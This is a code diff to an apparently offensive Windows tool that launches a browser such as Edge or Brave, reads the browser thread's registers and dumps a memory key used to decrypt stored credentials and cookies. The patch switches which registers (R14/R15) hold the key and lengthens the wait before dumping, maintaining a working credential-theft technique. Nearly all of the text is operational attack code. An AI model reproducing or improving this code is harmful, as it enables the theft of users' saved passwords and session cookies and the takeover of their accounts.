@@ -702,25 +702,26 @@ void DumpSecret(HANDLE hProc, HANDLE hThread, BOOL edge, BYTE* key) {
     printf("    RIP=%llx EFLAGS=%08lx\n", ctx.Rip, ctx.EFlags);
 #endif // _DEBUG
 
-    if (ctx.R14 == 0)
+    if (!edge && ctx.R15 == 0)
+    {
+        printf("[-] R15 registry was empty\n");
+        return;
+    }
+
+    if (edge && ctx.R14 == 0)
     {
         printf("[-] R14 registry was empty\n");
         return;
     }
 
-    if (edge && ctx.Rbx == 0)
-    {
-        printf("[-] RBX registry was empty\n");
-        return;
-    }
-
     if (edge)
     {
-        printf("[*] Dumping key from RBX\n");
-        PrintKey(hProc, ctx.Rbx, key);
-    } else {
         printf("[*] Dumping key from R14\n");
         PrintKey(hProc, ctx.R14, key);
+    }
+    else {
+        printf("[*] Dumping key from R15\n");
+        PrintKey(hProc, ctx.R15, key);
     }
 }
 
@@ -1177,12 +1178,12 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    //Edge is so slow to start that we need to wait to make sure the browser has loaded the profile databases
-    //Brave is somehow even slower... Maybe I we should just re-scan until the DB is found or timeout?
-    Sleep(500);
-
     if (config != Dump::None)
     {
+        //Edge is so slow to start that we need to wait to make sure the browser has loaded the profile databases
+        //Brave is somehow even slower... Maybe I we should just re-scan until the DB is found or timeout?
+        Sleep(5000);
+
         DWORD exitcode = 0;
         if (!GetExitCodeProcess(pi.hProcess, &exitcode)) {
             printf("[-] Couldn't check if the process handle is still valid. Error: %d\n", GetLastError());
@@ -1190,7 +1191,7 @@ int main(int argc, char* argv[]) {
         }
 
         if (exitcode != STILL_ACTIVE) {
-            printf("[-] The Browser process has likely crashed. Cannot dump creds/cookies\n");
+            printf("[-] The Browser process has likely crashed. Exit code: %#08x\n", exitcode);
             return 1;
         }
 
